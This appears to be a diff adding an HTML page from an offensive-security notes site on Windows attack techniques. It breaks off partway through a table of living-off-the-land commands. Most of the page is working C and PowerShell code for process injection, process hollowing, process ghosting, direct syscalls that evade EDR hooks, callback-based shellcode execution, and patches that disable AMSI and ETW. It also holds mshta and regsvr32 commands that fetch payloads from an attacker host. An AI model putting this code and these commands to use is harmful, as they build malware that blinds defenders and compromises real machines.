@@ -1,0 +1,2158 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Windows Offensive</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-powershell.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-c.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-csharp.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+  <h1>Windows Offensive Security</h1>
+
+  <ul class="nav nav-tabs" id="mainTabs" role="tablist">
+    <li class="nav-item" role="presentation">
+      <button class="nav-link active" id="notes-tab" data-bs-toggle="tab" data-bs-target="#notes" type="button" role="tab" aria-controls="notes" aria-selected="true">Notes</button>
+    </li>
+    <li class="nav-item" role="presentation">
+      <button class="nav-link" id="lab-tab" data-bs-toggle="tab" data-bs-target="#lab" type="button" role="tab" aria-controls="lab" aria-selected="false">Labs</button>
+    </li>
+    <li class="nav-item" role="presentation">
+      <button class="nav-link" id="ctf-tab" data-bs-toggle="tab" data-bs-target="#ctf" type="button" role="tab" aria-controls="ctf" aria-selected="false">CTF Challenges</button>
+    </li>
+  </ul>
+
+  <div class="tab-content" id="mainTabsContent">
+
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <!-- NOTES TAB -->
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <div class="tab-pane fade show active" id="notes" role="tabpanel" aria-labelledby="notes-tab">
+
+      <!-- ─────────────────────────────────────────────────────────────── -->
+      <h2>Process Injection Techniques</h2>
+      <!-- ─────────────────────────────────────────────────────────────── -->
+
+      <h3>Classic DLL Injection (CreateRemoteThread + LoadLibrary)</h3>
+      <p>The oldest and most well-understood injection technique. The attacker opens a handle to the target process, allocates memory for a DLL path string, writes the path, then creates a remote thread whose start address is <code>LoadLibraryA</code>/<code>LoadLibraryW</code> in kernel32.dll. Because kernel32 is mapped at the same base across processes (ASLR per-boot, not per-process), the address resolved in the injector is valid in the target.</p>
+      <p><strong>Detection surface:</strong> OpenProcess with PROCESS_ALL_ACCESS, VirtualAllocEx in remote process, WriteProcessMemory, CreateRemoteThread pointing to LoadLibrary. EDRs hook all of these in ntdll.</p>
+
+      <pre><code class="language-c">// Classic DLL Injection - Full implementation
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+BOOL InjectDLL(DWORD pid, const char* dllPath) {
+    HANDLE hProcess = OpenProcess(
+        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
+        PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
+        FALSE, pid);
+    if (!hProcess) return FALSE;
+
+    // Allocate memory in target for the DLL path string
+    SIZE_T pathLen = strlen(dllPath) + 1;
+    LPVOID remoteBuf = VirtualAllocEx(hProcess, NULL, pathLen,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remoteBuf) { CloseHandle(hProcess); return FALSE; }
+
+    // Write DLL path into target process memory
+    WriteProcessMemory(hProcess, remoteBuf, dllPath, pathLen, NULL);
+
+    // Resolve LoadLibraryA address (same across processes)
+    FARPROC loadLib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+
+    // Create remote thread starting at LoadLibraryA with our path as argument
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+        (LPTHREAD_START_ROUTINE)loadLib, remoteBuf, 0, NULL);
+    if (!hThread) {
+        VirtualFreeEx(hProcess, remoteBuf, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    WaitForSingleObject(hThread, INFINITE);
+    VirtualFreeEx(hProcess, remoteBuf, 0, MEM_RELEASE);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    return TRUE;
+}</code></pre>
+
+      <h3>Reflective DLL Injection</h3>
+      <p>Invented by Stephen Fewer. The DLL is never written to disk and never registered with the PEB's module list (LDR_DATA_TABLE_ENTRY). Instead, the raw DLL bytes are written into the target process, and a small bootstrap (the "reflective loader") inside the DLL maps itself: parses its own PE headers, resolves imports, applies relocations, calls DllMain. The loader is position-independent and typically found via an exported function (<code>ReflectiveLoader</code>).</p>
+      <p><strong>Key steps inside the reflective loader:</strong></p>
+      <ol>
+        <li>Walk PEB → PEB_LDR_DATA → InMemoryOrderModuleList to find kernel32 base</li>
+        <li>Manually resolve <code>VirtualAlloc</code>, <code>LoadLibraryA</code>, <code>GetProcAddress</code></li>
+        <li>Allocate memory at preferred base (or relocate)</li>
+        <li>Copy PE sections to correct RVAs</li>
+        <li>Process relocation table (.reloc) if rebased</li>
+        <li>Walk import directory, load dependent DLLs, resolve IAT</li>
+        <li>Set section memory protections (PAGE_EXECUTE_READ for .text, etc.)</li>
+        <li>Call TLS callbacks, then DllMain(DLL_PROCESS_ATTACH)</li>
+      </ol>
+
+      <pre><code class="language-c">// Simplified Reflective Loader concept (position-independent)
+// This runs INSIDE the target process after raw bytes are injected
+
+// Step 1: Find our own base by walking backwards from current EIP
+ULONG_PTR findOwnBase(void) {
+    ULONG_PTR addr = (ULONG_PTR)findOwnBase; // approximate
+    // Walk backwards to find MZ header
+    while (TRUE) {
+        addr &= ~0xFFF; // page-align
+        if (((PIMAGE_DOS_HEADER)addr)->e_magic == IMAGE_DOS_SIGNATURE) {
+            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(addr +
+                ((PIMAGE_DOS_HEADER)addr)->e_lfanew);
+            if (nt->Signature == IMAGE_NT_SIGNATURE)
+                return addr;
+        }
+        addr -= 0x1000;
+    }
+}
+
+// Step 2: Find kernel32 via PEB
+ULONG_PTR findKernel32(void) {
+    // TEB at gs:[0x30] on x64, fs:[0x30] on x86
+    PPEB peb;
+    #ifdef _WIN64
+    peb = (PPEB)__readgsqword(0x60);
+    #else
+    peb = (PPEB)__readfsdword(0x30);
+    #endif
+    
+    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
+    PLIST_ENTRY entry = head->Flink; // first = ntdll, second = kernel32
+    entry = entry->Flink; // skip ntdll
+    // The containing structure is LDR_DATA_TABLE_ENTRY
+    PLDR_DATA_TABLE_ENTRY ldrEntry = CONTAINING_RECORD(
+        entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+    return (ULONG_PTR)ldrEntry->DllBase;
+}</code></pre>
+
+      <h3>Process Hollowing (RunPE)</h3>
+      <p>Creates a legitimate process in SUSPENDED state, unmaps its original image, writes a malicious PE in its place, fixes the entry point in the thread context, then resumes. The malicious code runs under the identity of the hollowed process.</p>
+      <p><strong>Complete flow:</strong></p>
+      <ol>
+        <li><code>CreateProcess</code> with <code>CREATE_SUSPENDED</code> flag</li>
+        <li><code>NtQueryInformationProcess</code> to get PEB address → read <code>ImageBaseAddress</code></li>
+        <li><code>NtUnmapViewOfSection</code> to unmap original executable</li>
+        <li><code>VirtualAllocEx</code> at target's preferred base with full RWX</li>
+        <li>Write PE headers + all sections with correct section alignment</li>
+        <li>If rebased: apply relocations to the written image</li>
+        <li><code>SetThreadContext</code> to update RCX/EAX (entry point) in suspended thread</li>
+        <li>Update PEB's <code>ImageBaseAddress</code> if base changed</li>
+        <li><code>ResumeThread</code> — code executes as the hollow process</li>
+      </ol>
+
+      <pre><code class="language-c">// Process Hollowing skeleton
+#include &lt;windows.h&gt;
+#include &lt;winternl.h&gt;
+
+typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
+
+void HollowProcess(const char* targetExe, LPVOID payloadPE) {
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    
+    // 1. Create target suspended
+    CreateProcessA(targetExe, NULL, NULL, NULL, FALSE,
+        CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    
+    // 2. Get target PEB to find image base
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(pi.hThread, &ctx);
+    
+    // Read PEB->ImageBaseAddress (offset 0x10 in x64 PEB)
+    ULONG_PTR pebAddr;
+    #ifdef _WIN64
+    pebAddr = ctx.Rdx; // RDX points to PEB on x64 CreateProcess
+    #else
+    pebAddr = ctx.Ebx; // EBX points to PEB on x86
+    #endif
+    
+    LPVOID targetImageBase;
+    ReadProcessMemory(pi.hProcess,
+        (LPVOID)(pebAddr + (sizeof(PVOID) * 2)), // ImageBaseAddress offset
+        &targetImageBase, sizeof(LPVOID), NULL);
+    
+    // 3. Unmap original image
+    pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)
+        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
+    NtUnmap(pi.hProcess, targetImageBase);
+    
+    // 4. Parse payload PE headers
+    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)payloadPE;
+    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)
+        ((ULONG_PTR)payloadPE + dosHdr->e_lfanew);
+    
+    // 5. Allocate at preferred base
+    LPVOID newBase = VirtualAllocEx(pi.hProcess, 
+        (LPVOID)ntHdr->OptionalHeader.ImageBase,
+        ntHdr->OptionalHeader.SizeOfImage,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
+    // 6. Write headers
+    WriteProcessMemory(pi.hProcess, newBase, payloadPE,
+        ntHdr->OptionalHeader.SizeOfHeaders, NULL);
+    
+    // 7. Write sections
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHdr);
+    for (int i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
+        WriteProcessMemory(pi.hProcess,
+            (LPVOID)((ULONG_PTR)newBase + sec[i].VirtualAddress),
+            (LPVOID)((ULONG_PTR)payloadPE + sec[i].PointerToRawData),
+            sec[i].SizeOfRawData, NULL);
+    }
+    
+    // 8. Update entry point in thread context
+    #ifdef _WIN64
+    ctx.Rcx = (ULONG_PTR)newBase + ntHdr->OptionalHeader.AddressOfEntryPoint;
+    #else
+    ctx.Eax = (ULONG_PTR)newBase + ntHdr->OptionalHeader.AddressOfEntryPoint;
+    #endif
+    SetThreadContext(pi.hThread, &ctx);
+    
+    // 9. Update PEB->ImageBaseAddress
+    WriteProcessMemory(pi.hProcess,
+        (LPVOID)(pebAddr + (sizeof(PVOID) * 2)),
+        &newBase, sizeof(LPVOID), NULL);
+    
+    // 10. Resume
+    ResumeThread(pi.hThread);
+}</code></pre>
+
+      <h3>Thread Hijacking</h3>
+      <p>Instead of creating a new remote thread (which is highly monitored), hijack an existing thread in the target process. Suspend it, inject shellcode, modify RIP/EIP to point to shellcode, resume. Optionally restore original context after shellcode completes via a trampoline.</p>
+
+      <pre><code class="language-c">// Thread Hijacking
+void HijackThread(DWORD pid, LPVOID shellcode, SIZE_T scSize) {
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    
+    // Allocate executable memory for shellcode
+    LPVOID remoteSc = VirtualAllocEx(hProcess, NULL, scSize,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProcess, remoteSc, shellcode, scSize, NULL);
+    
+    // Find a thread in target process (use toolhelp)
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    THREADENTRY32 te = { sizeof(te) };
+    HANDLE hThread = NULL;
+    
+    Thread32First(hSnap, &te);
+    do {
+        if (te.th32OwnerProcessID == pid) {
+            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+            break;
+        }
+    } while (Thread32Next(hSnap, &te));
+    CloseHandle(hSnap);
+    
+    // Suspend target thread and modify its context
+    SuspendThread(hThread);
+    
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(hThread, &ctx);
+    
+    #ifdef _WIN64
+    ctx.Rip = (ULONG_PTR)remoteSc;
+    #else
+    ctx.Eip = (ULONG_PTR)remoteSc;
+    #endif
+    
+    SetThreadContext(hThread, &ctx);
+    ResumeThread(hThread);
+    
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+}</code></pre>
+
+      <h3>APC Injection (QueueUserAPC)</h3>
+      <p>Asynchronous Procedure Calls (APCs) are queued to a thread and execute when the thread enters an alertable wait state (<code>SleepEx</code>, <code>WaitForSingleObjectEx</code>, <code>MsgWaitForMultipleObjectsEx</code> with <code>bAlertable=TRUE</code>). The "Early Bird" variant queues the APC to a newly created suspended thread (before it runs any code), guaranteeing execution before AV hooks initialize.</p>
+
+      <pre><code class="language-c">// Early Bird APC Injection
+void EarlyBirdAPC(const char* targetExe, LPVOID shellcode, SIZE_T scSize) {
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    
+    // Create process SUSPENDED — main thread hasn't run yet
+    CreateProcessA(targetExe, NULL, NULL, NULL, FALSE,
+        CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    
+    // Allocate + write shellcode
+    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, scSize,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(pi.hProcess, remoteMem, shellcode, scSize, NULL);
+    
+    // Queue APC to the suspended main thread
+    // When thread resumes, it enters alertable wait during init → APC fires
+    QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, 0);
+    
+    // Resume thread — APC executes before ntdll!LdrInitializeThunk completes
+    ResumeThread(pi.hThread);
+    
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+}</code></pre>
+
+      <h3>Module Stomping</h3>
+      <p>Load a legitimate DLL into the target process, then overwrite its <code>.text</code> section with shellcode. The code executes from a valid, signed module's memory region. EDR sees a thread executing inside a known-good DLL. Choose a DLL that's rarely used so overwriting doesn't crash the process (e.g., <code>amsi.dll</code>, <code>wldp.dll</code>, or a large unused DLL).</p>
+
+      <pre><code class="language-c">// Module Stomping concept
+void ModuleStomp(HANDLE hProcess, const char* sacrificialDll,
+                 LPVOID shellcode, SIZE_T scSize) {
+    // Load the sacrificial DLL into target
+    // (use standard DLL injection first, or find already-loaded one)
+    
+    // Find .text section of the DLL in target
+    HMODULE hMod = NULL; // resolve via EnumProcessModules
+    MODULEINFO modInfo;
+    GetModuleInformation(hProcess, hMod, &modInfo, sizeof(modInfo));
+    
+    // Parse PE headers to find .text section RVA
+    IMAGE_DOS_HEADER dosHdr;
+    ReadProcessMemory(hProcess, modInfo.lpBaseOfDll, &dosHdr, sizeof(dosHdr), NULL);
+    
+    IMAGE_NT_HEADERS ntHdr;
+    ReadProcessMemory(hProcess,
+        (LPVOID)((ULONG_PTR)modInfo.lpBaseOfDll + dosHdr.e_lfanew),
+        &ntHdr, sizeof(ntHdr), NULL);
+    
+    IMAGE_SECTION_HEADER secHdr;
+    LPVOID secAddr = (LPVOID)((ULONG_PTR)modInfo.lpBaseOfDll +
+        dosHdr.e_lfanew + sizeof(IMAGE_NT_HEADERS));
+    
+    for (int i = 0; i < ntHdr.FileHeader.NumberOfSections; i++) {
+        ReadProcessMemory(hProcess,
+            (LPVOID)((ULONG_PTR)secAddr + i * sizeof(IMAGE_SECTION_HEADER)),
+            &secHdr, sizeof(secHdr), NULL);
+        if (memcmp(secHdr.Name, ".text", 5) == 0) break;
+    }
+    
+    LPVOID textSection = (LPVOID)((ULONG_PTR)modInfo.lpBaseOfDll +
+        secHdr.VirtualAddress);
+    
+    // Make .text writable, overwrite with shellcode
+    DWORD oldProtect;
+    VirtualProtectEx(hProcess, textSection, scSize, PAGE_READWRITE, &oldProtect);
+    WriteProcessMemory(hProcess, textSection, shellcode, scSize, NULL);
+    VirtualProtectEx(hProcess, textSection, scSize, PAGE_EXECUTE_READ, &oldProtect);
+    
+    // Execute via CreateRemoteThread pointing into the "legitimate" DLL
+    CreateRemoteThread(hProcess, NULL, 0,
+        (LPTHREAD_START_ROUTINE)textSection, NULL, 0, NULL);
+}</code></pre>
+
+      <h3>Direct Syscalls (Hell's Gate, Halo's Gate, SysWhispers)</h3>
+      <p>EDR products hook ntdll.dll functions (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, etc.) by placing JMP instructions at their entry points. Direct syscalls bypass these hooks entirely by invoking the syscall instruction directly with the correct System Service Number (SSN).</p>
+      
+      <p><strong>Hell's Gate:</strong> Reads ntdll.dll in memory, parses the <code>mov r10, rcx / mov eax, SSN</code> pattern at the beginning of each Nt* function to extract the SSN dynamically at runtime. If the function is hooked (JMP at start), it fails.</p>
+      
+      <p><strong>Halo's Gate:</strong> Extension of Hell's Gate — if the target function is hooked, look at neighboring syscall stubs (±1, ±2...) to find an unhooked one and calculate the target SSN by offset.</p>
+      
+      <p><strong>SysWhispers:</strong> Generates header files with embedded assembly stubs for direct syscalls. SysWhispers2 uses random syscall jumps. SysWhispers3 adds indirect syscalls.</p>
+
+      <pre><code class="language-c">// Direct Syscall stub (x64 MASM)
+// NtAllocateVirtualMemory SSN = 0x18 (Windows 10 1903+, varies by build)
+.code
+NtAllocateVirtualMemory PROC
+    mov r10, rcx          ; standard syscall convention
+    mov eax, 18h          ; SSN for NtAllocateVirtualMemory
+    syscall               ; transition to kernel
+    ret
+NtAllocateVirtualMemory ENDP
+
+// Hell's Gate - Dynamic SSN resolution
+DWORD GetSSN(LPVOID ntFuncAddr) {
+    // Clean syscall stub pattern:
+    // 4C 8B D1      mov r10, rcx
+    // B8 xx xx 00 00  mov eax, SSN
+    BYTE* func = (BYTE*)ntFuncAddr;
+    
+    if (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1 &&  // mov r10, rcx
+        func[3] == 0xB8) {                                         // mov eax, imm32
+        // Not hooked — extract SSN directly
+        return *(DWORD*)(func + 4);
+    }
+    
+    // Hooked! Use Halo's Gate — check neighbors
+    for (int i = 1; i < 500; i++) {
+        // Check downward neighbor
+        BYTE* neighbor = func + (i * 32); // syscall stubs are 32 bytes apart
+        if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[2] == 0xD1 &&
+            neighbor[3] == 0xB8) {
+            return *(DWORD*)(neighbor + 4) - i; // subtract offset
+        }
+        // Check upward neighbor
+        neighbor = func - (i * 32);
+        if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[2] == 0xD1 &&
+            neighbor[3] == 0xB8) {
+            return *(DWORD*)(neighbor + 4) + i; // add offset
+        }
+    }
+    return 0; // failed
+}</code></pre>
+
+      <h3>Indirect Syscalls</h3>
+      <p>Direct syscalls have a tell: the <code>syscall</code> instruction executes from outside ntdll.dll. ETW/kernel callbacks can detect this by checking the return address. Indirect syscalls solve this by JMPing to the <code>syscall; ret</code> instruction within the legitimate ntdll stub, so the return address appears to originate from ntdll.</p>
+
+      <pre><code class="language-c">// Indirect Syscall concept (x64)
+// Instead of executing 'syscall' directly, JMP to ntdll's syscall instruction
+.code
+NtAllocateVirtualMemory_Indirect PROC
+    mov r10, rcx
+    mov eax, 18h              ; SSN
+    jmp qword ptr [syscallAddr] ; jump to ntdll!NtAllocateVirtualMemory+0x12
+                               ; (the 'syscall' instruction inside ntdll)
+NtAllocateVirtualMemory_Indirect ENDP
+
+// Finding the syscall instruction address in ntdll:
+LPVOID FindSyscallInstruction(LPVOID ntFunc) {
+    BYTE* p = (BYTE*)ntFunc;
+    for (int i = 0; i < 32; i++) {
+        if (p[i] == 0x0F && p[i+1] == 0x05) { // syscall opcode
+            return &p[i];
+        }
+    }
+    return NULL;
+}</code></pre>
+
+      <h3>Process Ghosting, Doppelganging, Transacted Hollowing</h3>
+      <p><strong>Process Doppelganging:</strong> Uses NTFS transactions (TxF). Create a transaction → write malicious PE to a transacted file → create section from transacted file → rollback transaction (file disappears from disk) → create process from the in-memory section. The file was never actually committed to disk.</p>
+      
+      <p><strong>Process Ghosting:</strong> Exploits a gap in the Windows delete-pending state. Create a file → set it to delete-pending (NtSetInformationFile with FileDispositionInformation) → write payload → create image section (succeeds because file is still technically open) → close file handle (file gets deleted) → create process from section. The executable is deleted before the process starts running.</p>
+      
+      <p><strong>Transacted Hollowing:</strong> Combines TxF with hollowing. Create a transaction, write payload into a transacted file, map it into target process, rollback. Similar to doppelganging but used to inject into existing processes.</p>
+
+      <pre><code class="language-c">// Process Ghosting flow
+#include &lt;winternl.h&gt;
+
+void ProcessGhosting(LPVOID payload, DWORD payloadSize) {
+    // 1. Create temp file
+    HANDLE hFile = CreateFileW(L"C:\\Temp\\ghost.exe",
+        GENERIC_READ | GENERIC_WRITE | DELETE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    
+    // 2. Set delete-pending BEFORE writing content
+    FILE_DISPOSITION_INFORMATION fdi = { TRUE };
+    IO_STATUS_BLOCK iosb;
+    NtSetInformationFile(hFile, &iosb, &fdi, sizeof(fdi),
+        FileDispositionInformation);
+    
+    // 3. Write payload to the delete-pending file
+    DWORD written;
+    WriteFile(hFile, payload, payloadSize, &written, NULL);
+    
+    // 4. Create image section from the file
+    HANDLE hSection = NULL;
+    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
+        PAGE_READONLY, SEC_IMAGE, hFile);
+    
+    // 5. Close file handle → file is deleted from disk
+    CloseHandle(hFile);
+    // File is now GONE from the filesystem
+    
+    // 6. Create process from the ghost section
+    HANDLE hProcess = NULL;
+    NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL,
+        NtCurrentProcess(), 0, hSection, NULL, NULL, 0);
+    
+    // 7. Set up process parameters, create initial thread, etc.
+    // ... (requires NtCreateThreadEx, RtlCreateProcessParametersEx)
+}</code></pre>
+
+      <h3>Callback-Based Execution</h3>
+      <p>Instead of <code>CreateThread</code> or <code>CreateRemoteThread</code>, abuse Windows API functions that accept callback pointers. Many legitimate APIs call user-supplied function pointers internally, executing your shellcode without explicitly creating a thread.</p>
+
+      <pre><code class="language-c">// Callback-based shellcode execution alternatives
+// All of these can replace CreateThread for local execution
+
+// 1. EnumWindows - calls callback for each top-level window
+EnumWindows((WNDENUMPROC)shellcodeAddr, 0);
+
+// 2. EnumChildWindows
+EnumChildWindows(GetDesktopWindow(), (WNDENUMPROC)shellcodeAddr, 0);
+
+// 3. EnumFonts / EnumFontFamilies
+HDC hdc = GetDC(NULL);
+EnumFonts(hdc, NULL, (FONTENUMPROC)shellcodeAddr, 0);
+
+// 4. CreateTimerQueueTimer - executes callback after delay
+HANDLE hTimer, hQueue = CreateTimerQueue();
+CreateTimerQueueTimer(&hTimer, hQueue,
+    (WAITORTIMERCALLBACK)shellcodeAddr, NULL, 100, 0, 0);
+
+// 5. EnumDesktops
+EnumDesktopsW(GetProcessWindowStation(),
+    (DESKTOPENUMPROCW)shellcodeAddr, 0);
+
+// 6. EnumResourceTypes
+EnumResourceTypesW(GetModuleHandle(NULL),
+    (ENUMRESTYPEPROCW)shellcodeAddr, 0);
+
+// 7. CertEnumSystemStore (very stealthy)
+CertEnumSystemStore(CERT_SYSTEM_STORE_LOCAL_MACHINE, NULL, NULL,
+    (PFN_CERT_ENUM_SYSTEM_STORE)shellcodeAddr);
+
+// 8. EnumDateFormats
+EnumDateFormatsW((DATEFMT_ENUMPROCW)shellcodeAddr, LOCALE_USER_DEFAULT, 0);
+
+// 9. Fiber-based execution
+LPVOID fiber = ConvertThreadToFiber(NULL);
+LPVOID scFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)shellcodeAddr, NULL);
+SwitchToFiber(scFiber);</code></pre>
+
+      <h3>ETW/AMSI Patching</h3>
+      <p><strong>AMSI (Antimalware Scan Interface):</strong> Loaded as amsi.dll into PowerShell, .NET, VBScript, JScript, etc. The key function is <code>AmsiScanBuffer</code>. Patching its first bytes to return <code>AMSI_RESULT_CLEAN</code> (or just <code>ret</code>) disables all script-based scanning.</p>
+      
+      <p><strong>ETW (Event Tracing for Windows):</strong> <code>EtwEventWrite</code> in ntdll.dll is used to log events. Patching it to immediately return disables telemetry that EDRs consume. The patch target is <code>ntdll!EtwEventWrite</code>.</p>
+
+      <pre><code class="language-powershell"># AMSI Bypass - Patch AmsiScanBuffer to return clean
+$a = [Ref].Assembly.GetTypes() | ? {$_.Name -like "*iUtils"}
+$f = $a.GetFields('NonPublic,Static') | ? {$_.Name -like "*Context"}
+[IntPtr]$ptr = $f.GetValue($null)
+[Int32[]]$buf = @(0)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)</code></pre>
+
+      <pre><code class="language-c">// ETW Patch - Make EtwEventWrite immediately return
+void PatchETW() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    LPVOID etwFunc = GetProcAddress(hNtdll, "EtwEventWrite");
+    
+    DWORD oldProtect;
+    VirtualProtect(etwFunc, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
+    
+    // xor eax, eax; ret (return STATUS_SUCCESS)
+    memcpy(etwFunc, "\x33\xC0\xC3", 3);
+    
+    VirtualProtect(etwFunc, 1, oldProtect, &oldProtect);
+}
+
+// AMSI Patch in C
+void PatchAMSI() {
+    HMODULE hAmsi = LoadLibraryA("amsi.dll");
+    LPVOID amsiScanBuf = GetProcAddress(hAmsi, "AmsiScanBuffer");
+    
+    DWORD oldProtect;
+    VirtualProtect(amsiScanBuf, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
+    
+    // mov eax, 0x80070057 (E_INVALIDARG) ; ret
+    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+    memcpy(amsiScanBuf, patch, sizeof(patch));
+    
+    VirtualProtect(amsiScanBuf, 6, oldProtect, &oldProtect);
+}</code></pre>
+
+      <h3>PPID Spoofing</h3>
+      <p>Spoof the parent process of a new process using <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> in the <code>STARTUPINFOEX</code> structure. Makes the new process appear to be spawned by a different parent (e.g., explorer.exe), evading process-tree-based detection.</p>
+
+      <pre><code class="language-c">// PPID Spoofing
+BOOL SpawnWithSpoofedParent(DWORD spoofedParentPid, const char* childExe) {
+    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoofedParentPid);
+    
+    SIZE_T attrSize = 0;
+    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
+    
+    LPPROC_THREAD_ATTRIBUTE_LIST attrList = 
+        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
+    InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize);
+    
+    UpdateProcThreadAttribute(attrList, 0,
+        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+        &hParent, sizeof(HANDLE), NULL, NULL);
+    
+    STARTUPINFOEXA si = { 0 };
+    si.StartupInfo.cb = sizeof(si);
+    si.lpAttributeList = attrList;
+    
+    PROCESS_INFORMATION pi;
+    CreateProcessA(childExe, NULL, NULL, NULL, FALSE,
+        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
+        NULL, NULL, &si.StartupInfo, &pi);
+    
+    DeleteProcThreadAttributeList(attrList);
+    HeapFree(GetProcessHeap(), 0, attrList);
+    CloseHandle(hParent);
+    return TRUE;
+}</code></pre>
+
+      <!-- ─────────────────────────────────────────────────────────────── -->
+      <h2>Living-off-the-Land (LOLBAS)</h2>
+      <!-- ─────────────────────────────────────────────────────────────── -->
+
+      <h3>Execution Proxies</h3>
+      <table class="table table-dark table-bordered table-sm">
+        <thead><tr><th>Binary</th><th>Technique</th><th>Command</th></tr></thead>
+        <tbody>
+          <tr><td>mshta.exe</td><td>Execute HTA (HTML Application)</td><td><code>mshta http://attacker.com/payload.hta</code></td></tr>
+          <tr><td>mshta.exe</td><td>Inline VBScript</td><td><code>mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""calc"":close")</code></td></tr>
+          <tr><td>rundll32.exe</td><td>Execute DLL export</td><td><code>rundll32.exe payload.dll,EntryPoint</code></td></tr>
+          <tr><td>rundll32.exe</td><td>JavaScript execution</td><td><code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";eval("...")</code></td></tr>
+          <tr><td>regsvr32.exe</td><td>Squiblydoo (SCT file)</td><td><code>regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll</code></td></tr>
